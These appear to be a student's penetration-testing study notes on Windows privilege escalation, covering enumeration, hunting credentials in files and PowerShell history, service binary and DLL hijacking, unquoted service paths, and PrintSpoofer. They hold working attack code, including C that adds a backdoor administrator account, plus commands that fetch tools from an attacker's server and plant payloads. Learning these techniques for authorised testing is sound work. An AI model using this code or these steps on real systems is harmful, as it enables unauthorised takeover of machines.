# Enumerating Windows

### Understanding Windows Privileges and Access Control Mechanisms

- SID (Security Identifier)
	- identify entities
		- entities = principals
	- generated by LSA (Local Security Authroity) for local accounts
	- generated by DC (Domain Controller) on domain accounts
	- S-R-X-Y
		- S = SID
		- R = Revision (always set to 1)
		- X = identifier authority
			- 5 = NT Authority (most common)
		- Y = sub authorities
			- domain identifier and RID (relative identifier)
				- domain identifier = SID for domain, SID for local, and "32" for built-in
				- RID determines user or groups
		- S-1-5-21-1336799502-1441772794-948155058-[1001]
			- 1001 = RID
				- starts at 1000
				- implies this is the 2nd local user created
		- RID under 1000 = well-known SIDS
		- S-1-0-0                       Nobody        
			S-1-1-0	                      Everybody
			S-1-5-11                      Authenticated Users
			S-1-5-18                      Local System
			S-1-5-domainidentifier-500    Administrator
- Access Token
		- After authentification, user gets token
	- primary token (given)
	- impersonation token (optional)
- Mandatory Integrity Control
	- Integrity levels
		- System = SYTEM (kernal, ...)
		- High = Elevated users
		- Medium = Standard users
		- Low = Very restricted rights often used in sandboxed[^privesc_win_sandbox] processes or for directories storing temporary data
		- Untrusted = Lowest integrity level with extremely limited access rights for processes or objects that pose the most potential risk
	- A principal with a lower integrity level cannot write to an object with a higher level
	- Display Integrity Level
		- Process Explorer
			- processes
		- whoami /groups
			- current user
		- icacls
			- files
- UAC (User Account Control)
	- Admins can have standard user privileges
	- After login as admin:
		- standard user token (or filtered admin token)
			- used to perform non-privileged operations
		- Administrator token
			- privileged operations

### Situational Awareness
- Always obtain (logged in as unpriv user)
	- Username and hostname
		- whoami
	- Group memberships of the current user
		- whoami /groups
	- Existing users and groups
		1.  powershell
		2. Get-LocalUser
		- or net user
		3. Get-LocalGroup
		- or net localgroup
				- Backup Operators can backup and restore all files
				- Remote Desktop Users can access with RDP
				- Remote Management Users can access with WinRM
		4. Get-LocalGroupMember adminteam
		5. Get-LocalGroupMember Administrators
	- Operating system, version and architecture
		- systeminfo
	- Network information
		- ipconfig /all
				- important stuff to look for:
			- physical address
			- dhcp enabled
			- ipv4 address
			- default gateway
			- dns servers
		- route print
		- netstat -ano
				-listening on 80/443 = usually a web server
				- listening on 3306 = usually MySQL server
			- -a = all active TCP & UDP
			- -n = disable name resolution
			- -o = show process ID for each connection
	- Installed applications
			- Using Windows Registry and the Get-ItemProperty Cmdlet.
		- Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
			- Query registry key to get 32 bit applications in the
			- displayname = display application names
		- Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
			- Query different registry key to get 64 bit applications.
		- [Always Check] Program Files in C:\ and Downloads folder
			- Get-ItemProperty may not get everything
	- Running processes
		- Get-Process
		- Get-Process | Select-Object -ExpandProperty Path

### Hidden in Plain View
#searching #windows #files
			-searching for windows files
- Example:
	- Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
			- (since we know the tgt have KeePass installed)
	- Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
			- (since we know the tgt has XAMPP installed)
	- type C: \xampp\passwords.txt
	- type C:\xampp\mysql\bin\my.ini
	- Get-ChildItem -Path C:\Users\robert\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
			- (searching all of dave's files)
	- cat = type
		- cmdlet of Get-Content
	- net user steve
	- RDP to steve
	- type C:\xampp\mysql\bin\my.ini
	- net user backupdamin
	- **Runas**
		- allows to run a program as a different user
		- need GUI
	- Log on as a batch job
		- access right
		- schedule a task to execute a program from different user
		- if target user has an active session, can use PsExec from Sysinternals
	- runas /user:backupadmin cmd
		- execute cmd as different user
- Windows grep = Pipe to Select-String " "

### Information Goldmine PowerShell

- Logging Mechanisms
	- PowerShell Transcripton
		- "over-the-shoulder-transcription"\
			- logs everythings a person would obtain looking over the shoulder of the user
		- stored in transcript files		
	- PowerShell Script Block Logging
		- Records command and blocks of script code as events while executing
			- full content of code
			- includes original encoded codes or commands
		- (RDP --> Event Viewer) = to view logs
- Get-History
	- get past commands from PowerShell History
- Clear-History
	- removes past commands
	- does not remove PSReadline
- [PSReadline]
	- command history
	- not removed from Clear-History
-  PowerShell Remoting
	- Default = WinRM for Enter-PSSession
		- need to be local group of Windows Management Users
	- Can use SSH instead

- Example:
	1.  ```(Get-PSReadlineOption).HistorySavePath```
		- show path of the PSReadline history file
	2. ```type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt```
		- open file
	3. ```type C:\Users\Public\Transcripts\transcript01.txt ```
		- since transcript started before Enter-PSSession / maybe creds?
	4. ```$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force```
		- create SecureString to store password
	5. ```$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)```
		- create PSCredential object w/ username & password
	6. ```Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred```
		- use variable arguments in Enter-PSSession
	- [note that creating a PowerShell remoting session via WinRM in a bind shell like we used in this example can cause unexpected behavior]
- evil-winrm
	- pass the hash
	- in-memory loading
	- file upload/downlaod

	7. ```evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"```
		- -i = ip
		- -u = username
		- -p = password
			- escaping bangs '!''s
	- Admins can prevent PSReadline by -HistorySaveStyle option to SaveNothing with the Set-PSReadlineOption Cmdlet

### Automated Enumeration

- winPEAS
	- [Note:] <--------------------------
		- [If there is no color use this:]
			- `REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1`
	- If blocked by AV --> use Seatbelt or JAWS
		- google **compiled seatbelt github download**
	- package = peass

	- Example:
		- Copy 64-bit binary of winPEAS to home directory and serve it with Python server
			- ```cp /usr/share/peass/winpeas/winPEASx64.exe .```
			- ```python3 -m http.server 80```
		- Connect to bind shell
			- nc 192.168.50.220 4444
		- powershell
		- Grab the file from host using iwr Cmdlet
			- ```iwr -uri http://192.168.45.204/winPEASx64.exe -Outfile winPEAS.exe```
			- ```.\winPEAS.exe```
		- Check  transcript history if winPEAS missed
			- C:\Users\Public
		- Manually check in case winPEAS misses stuff

# Leveraging Windows Services

- Windows Service
	- managed by
		- Service Control Manager
		- Services snap-in
		- PowerShell
		- sc.exe
	- uses
		- LocalSystem (includes SID of SYSTEM & Administrators in its token)
		- Network Service
		- Local Service user accounts

### Service Binary Hijacking
	- Each service has binary file
	- Using a network logon such as WinRM or a bind shell, Get-CimInstance and Get-Service will result in a "permission denied" error when querying for services with a non-admin account. RDP solves this issue
- List all installed Windows Services
	- GUI services.msc
	- Get-Service Cmdlet
	- Get-CimInstance Cmdlet (superseding Get-WmiObject)
- Example:
	- Using Get-CimInstance to query the WMI class **win32_service**
		- ```Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}```
	- Enumerate permission on service binaries
		- icalcs (or) [cmd & pwsh]
		- Get-ACL [pwsh]
		- ```|Mask|Permissions|
			|F|Full access|
			|M|Modify access|
			|RX|Read and execute access|
			|R|Read-only access|
			|W|Write-only access|
			I = inherited by parent dir```
	- Using icalcs on httpd.exe
		- ```icacls "C:\xampp\apache\bin\httpd.exe"```
	- Using icalcs on mysqld.exe
		- ```icacls "C:\xampp\mysql\bin\mysqld.exe"```
	- create a small binary to replace mysqld.exe
		- adduser.c ->
		- ```#include <stdlib.h>
			int main ()
			{int i;
			  i = system ("net user dave2 password123! /add");
			  i = system ("net localgroup administrators dave2 /add");
			  return 0;}```
	  - mingw-64
		  - cross-compile on kali
		  - since 64 bit -> x86_54
		  - ```x86_64-w64-mingw32-gcc adduser.c -o adduser.exe```
	- Transfer .exe to TGT
		1. ```iwr -uri http://192.168.45.201/adduser.exe -Outfile adduser.exe```
	- Move Windows binary to home directory, 
		1. ```move C:\xampp\mysql\bin\mysqld.exe mysqld.exe```
			- To later restore service
	- Replace windows binary with .exe
		1. ```move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe```
	- Restart service
		- ```net stop mysql``` = access denied
	- Check if service Startup Type is set to "Automatic"
		- ```Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}```
	- To reboot, user needs privilege *SeShutDownPrivilege*
	- List all privileges
		- whoami /priv
			- [Disabled = currently enabled for the running process (i.e whoami is not using it)]
	- Reboot system
		- ```shutdown /r /t 0```
			- /r = reboot
			- /t = in 0 seconds
	- Check if .exe worked and user was created
		- ```Get-LocalGroupMember administrators```
- PowerUp.ps1
	- ```cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .```
	- ```python3 -m http.server 80```
	- ```iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1```
	- ```powershell -ep bypass```
		- ExecutionPolicy Bypass -> need to run scripts
	- ```. .\PowerUp.ps1```
	- ``` ```
		- displays services the current user can modify
	- AbuseFunction
		- ```Install-ServiceBinary -Name 'mysql'```
	- ```Get-ModifiablePath``` 
	- ```$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal```
		- try service binary w/out arguments
	- ```$ModifiableFiles```
	- ```$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal```
		- add argument
	- ```$ModifiableFiles```
	- ```$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal ```
		- add path argument
	- ```$ModifiableFiles```
### Service DLL Hijacking
- Dynamic Link Libraries (DLL) = Shared Object (linux)
- DLL search order
	- Microsoft determines what to inspect first when searcing for DLLs
		1. The directory from which the application loaded.
		2. The system directory.
		3. The 16-bit system directory.
		4. The Windows directory. 
		5. The current directory.
		6. The directories that are listed in the PATH environment variable.
			- ```$env:path```
		- When "safe" DLL search mode is dabled:
			- current directory -> 2
- Placing a malicious DLL (with name "missing DLL") in a path of the DLL search order so it executes
	- Example:
		- Enumerate Services
			- ```Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}```
		- check permissions
			- ```icacls .\Documents\BetaServ.exe```
		- *Process Montior*
			- (needs admin priv)
			- ```C:\tools\Procmon\****C:\tools\Procmon\Procmon54.exe```
		- Restart service
			- ```Restart-Service BetaService```
		- - DLL
			- DllMain = entry point function
					- executed when attached
				- _DLL_PROCESS_ATTACH_
				- _DLL_THREAD_ATTACH_
				- _DLL_THREAD_DETACH_
				- _DLL_PROCESS_DETACH_
		- DLL code template
			- ```OOL APIENTRY DllMain(HANDLE hModule,// Handle to DLL module DWORD ul_reason_for_call,// Reason for calling function LPVOID lpReserved ) // Reserved
				{
				    switch ( ul_reason_for_call )
				    {
				        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
				        break;
				        case DLL_THREAD_ATTACH: // A process is creating a new thread.
				        break;
				        case DLL_THREAD_DETACH: // A thread exits normally.
				        break;
				        case DLL_PROCESS_DETACH: // A process unloads the DLL.
				        break;
				    }
				    return TRUE;
				}```
		- Added malicious code
			- ```#include <stdlib.h>
				#include <windows.h>
				BOOL APIENTRY DllMain(
				HANDLE hModule,// Handle to DLL module
				DWORD ul_reason_for_call,// Reason for calling function
				LPVOID lpReserved ) // Reserved
				{
				    switch ( ul_reason_for_call )
				    {
				        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
				        int i;
				  	    i = system ("net user dave2 password123! /add");
				  	    i = system ("net localgroup administrators dave2 /add");
				        break;
				        case DLL_THREAD_ATTACH: // A process is creating a new thread.
				        break;
				        case DLL_THREAD_DETACH: // A thread exits normally.
				        break;
				        case DLL_PROCESS_DETACH: // A process unloads the DLL.
				        break;
				    }
				    return TRUE;
				}```
		- Coss-compile
			- ```x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll```
				- --shared = DLL
		- Transfer DLL to tgt machine
				- change cwd to *Documents* for the DLL attack to executefrom the path
			- ```iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll```
		- Restart BetaService
			- ```Restart-Service BetaService```
		- ```net localgroup administrators```

### Unquoted Service Paths
	- when you have Write perms to a service's directories but cannot replace files within them
- CreateProcess function -> service started
	- IpApplicationName
		- used to specify name & path of .exe
	- Function reads paths from left to write adding a .exe for every space 
		- (```i.e C:\My.exe Program\My.exe Service\```)
- Example:
	- enumerate ruunning & stopped services:
		- ```Get-CimInstance -ClassName win32_service | Select Name,State,PathName```
	- find spaces in the paths and missing quotes specifically
		- ```wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """```
	- test start and stop
		- ```Start-Service GammaService```
		- ```Stop-Service GammaService```
	- check permission to all interpreted paths
		- ```icacls "C:\"
			icacls "C:\Program Files"
			icacls "C:\Program Files\Enterprise Apps"```
	- replace adduser.exe in Current.exe path
		- ```iwr -uri http://192.168.45.230/adduser.exe -Outfile Current.exe```
		- ```copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'```
		- ```Start-Service GammaService```
- Example with PowerUp [way quicker]:
	- Find unquoted services
		- ```iwr http://192.168.45.230/PowerUp.ps1 -Outfile PowerUp.ps1
			powershell -ep bypass
			. .\PowerUp.ps1
			Get-UnquotedService```
	- Use AbuseFunction and write  to binary
		- ```Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"```
			- default -> create user john w/ password: Password123!
	- ```Restart-Service GammaService```

# Abusing Other Windows Components

### Scheduled Tasks

- Vital info about tasks
	-  As which user account (principal) does this task get executed?
		- If runs as NT AUTHOIRTY/SYSTEM or admin user -> can lead to Privesc
	- What triggers are specified for the task?
		- if already triggered / if trigger happens too late / is this task viable?
	- What actions are executed when one or more of these triggers are met?
		- how to perform Privesc
- Get-ScheduledTask
	- Cmdlet to view scheduled tasks
- schtasks /query
	- view scheduled tasks
	- ```schtasks /query /fo LIST /v```
	- or ```schtasks /query /fo LIST /v | findstr "  "```
		- /fo = output format
		- /v = display all properties (verbose)
- replace .exe we have permission on with malfware
	- (i.e) transfer over adduser.exe

### Using Exploits

- *application-based* vulnerabilites
- *Windows Kernel*
- Windows privileges
		-  SeBackupPrivilege
		- SeAssignPrimaryToken
		- SeLoadDriver
		- SeDebug
	- *SeImpersonatePrivilege*
		- Non-priv users with assigned privs
			- Enabled by default on:
				- Administrators group
				- LOCAL SERVICE account
				- NETWORK SERVICE account
				- SERVICE  account
		- Can be found in exploiting an IIS (Internet Information Service) web server
			- IIS runs as _LocalService_, _LocalSystem_, _NetworkService_, or cApplicationPoolIdentity
		- RPC or *named pipes*
			- Once a client connects to a named pipe, the server can leverage _SeImpersonatePrivilege_ to impersonate this client after capturing the authentication from the connection process.
- *PrintSpoofer*
	- coerce ```NT AUTHORITY\SYSTEM``` into connecting to a controlled named pipe.
	- variation of the *printer bug
	- Example:
		- check privs
			- ```whoami /priv```
		- Download PrintSpoofer
			- ```wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe```
		- Transfer to tgt 
			- ```python3 -m http.server 80```
			- ```iwr -uri http://192.168.45.230/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe```
		- Start PowerShell session in context of ```NT AUTHORITY\SYSTEM``` with PrintSpoofer
			- ```.\PrintSpoofer64.exe -i -c powershell.exe```
				- -c = command
				- -i = interact in current cmd prompt
		- verify
			- ```whoami```
- *Potato* family
		- effective alternative to PrintSpoofer
	- RottenPotato
	- SweetPotato
	- JuicyPotato
- Change permissions
	- ```"C:\Users\diana\EnterpriseService.exe" /grant:r "administrator:(F)" /C```
	- ```ICACLS "C:\Users\diana\EnterpriseService.exe" /grant:r```
- *privileged file writes*
	- wasnt covered (but another attack vector) 
	